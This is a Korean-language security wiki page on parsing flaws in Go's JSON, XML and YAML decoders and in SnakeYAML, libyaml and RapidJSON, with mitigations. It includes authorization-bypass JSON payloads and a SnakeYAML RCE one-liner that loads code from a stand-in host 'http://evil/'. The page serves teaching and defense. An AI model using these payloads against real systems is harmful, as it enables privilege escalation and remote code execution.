# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

다음 문제들은 Go JSON에서 발견되었지만 다른 언어에도 존재할 수 있습니다. 이러한 문제들은 [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)에 공개되었습니다.

Go의 JSON, XML, YAML 파서는 일관성 부족과 안전하지 않은 기본 설정이 오래전부터 이어져 왔으며, 이는 **인증 우회**, **권한 상승**, 또는 **민감한 데이터 유출**에 악용될 수 있습니다.


### (Un)Marshaling Unexpected Data

목표는 공격자가 민감한 필드(예: `IsAdmin`, `Password`)를 읽거나 쓸 수 있도록 허용하는 구조체(struct)를 악용하는 것입니다.

- 예시 구조체:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- 일반적인 취약점

1. **태그 없음** (태그가 없으면 = 필드는 기본적으로 여전히 파싱됩니다):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **`-`의 잘못된 사용**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ❌ wrong
}
```
Payload:
```json
{"-": true}
```
✔️ 필드가 (un)marshaled 되는 것을 차단하는 올바른 방법:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### 파서 차이

목표는 서로 다른 파서가 동일한 페이로드를 다르게 해석하는 점을 이용해 authorization을 bypass하는 것입니다. 예:

- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. 중복 필드:**
Go의 `encoding/json`는 **마지막** 필드를 취합니다.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
다른 파서(예: Java’s Jackson)는 **첫 번째 값**을 선택할 수 있습니다.

**2. 대소문자 구분 없음:**  
Go는 대소문자를 구분하지 않습니다:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Unicode 트릭도 통한다:
```go
json.Unmarshal([]byte(`{"aKtionſ": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
상상해보자:
- Proxy가 Go로 작성됨
- AuthZ service가 Python으로 작성됨

Attacker가 보냄:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python은 `UserAction`을 보고 허용한다
- Go는 `AdminAction`을 보고 실행한다


### 데이터 형식 혼동 (Polyglots)

목표는 포맷을 혼합(JSON/XML/YAML)하거나 파서 오류 시 fail open하는 시스템을 악용하는 것이다. 예:
- **CVE-2020-16250**: HashiCorp Vault는 STS가 XML 대신 JSON을 반환한 후 XML 파서로 JSON을 파싱했다.

공격자가 제어하는 항목:
- `Accept: application/json` 헤더
- JSON 본문의 일부 제어

Go의 XML 파서는 **어쨌든** 이를 파싱했고 주입된 신원을 신뢰했다.

- 제작된 payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
결과:
- **Go JSON** 파서: `Action_2` (대소문자 구분하지 않음 + 마지막 항목 우선)
- **YAML** 파서: `Action_1` (대소문자 구분)
- **XML** 파서: 문자열 내부의 `"Action_3"`을 파싱함

---

## 주목할 만한 파서 취약점 (2023-2025)

> 다음 공개적으로 악용 가능한 이슈들은 안전하지 않은 파싱이 다중 언어 문제라는 것을 보여준다 — 단지 Go만의 문제가 아니다.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* 영향 대상: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins 등에서 사용됨).
* 근본 원인: `new Constructor()`가 **임의의 Java 클래스**를 역직렬화하여 gadget 체인을 허용하며, 이는 원격 코드 실행으로 이어질 수 있음.
* 원라이너 PoC (취약한 호스트에서 계산기를 실행함):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* 수정 / 완화:
1. **≥2.0로 업그레이드** (`SafeLoader`를 기본으로 사용).
2. 구버전에서는 명시적으로 `new Yaml(new SafeConstructor())`를 사용하세요.

### libyaml Double-Free (CVE-2024-35325)

* 영향 받음: `libyaml` ≤0.2.5 (많은 언어 바인딩에서 활용되는 C 라이브러리).
* 문제: `yaml_event_delete()`를 두 번 호출하면 double-free가 발생하여 공격자가 DoS로 만들거나, 일부 시나리오에서는 heap exploitation으로 이어질 수 있습니다.
* 상태: Upstream에서 “API misuse”로 거부했지만, 리눅스 배포판들은 방어적으로 포인터를 null-free 처리하는 패치된 **0.2.6**을 배포했습니다.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* 영향 받음: Tencent **RapidJSON** `8269bc2` 커밋 이전 (<1.1.0-patch-22).
* 취약점: `GenericReader::ParseNumber()`에서 검증되지 않은 산술 연산으로 인해 공격자가 크게 벗어난 숫자 리터럴을 조작해 wrap-around를 발생시키고 heap을 손상시킬 수 있으며 — 결과 객체 그래프가 권한 결정에 사용될 경우 결국 privilege-escalation을 가능하게 합니다.

---

### 🔐 완화책 (업데이트됨)

| Risk                                | Fix / Recommendation                                      |
|-------------------------------------|------------------------------------------------------------|
| 알 수 없는 필드 (JSON)               | `decoder.DisallowUnknownFields()`                          |
| 중복 필드 (JSON)                     | ❌ stdlib에는 수정 없음 — 검증을 위해 [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) 사용 |
| 대소문자 무시 매칭 (Go)             | ❌ 수정 없음 — struct tag을 검증하고 입력을 사전 정규화(pre-canonicalize) |
| XML 불필요 데이터 / XXE              | 강화된 파서 사용 (`encoding/xml` + `DisallowDTD`)         |
| YAML 알 수 없는 키                   | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | SafeConstructor 사용 / SnakeYAML ≥2.0으로 업그레이드       |
| libyaml ≤0.2.5 double-free          | **0.2.6** 또는 배포판 패치 릴리스로 업그레이드             |
| RapidJSON <patched commit           | 최신 RapidJSON(≥July 2024)으로 컴파일                      |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## 참고자료

- Baeldung – “Resolving CVE-2022-1471 With SnakeYAML 2.0”
- Ubuntu Security Tracker – CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
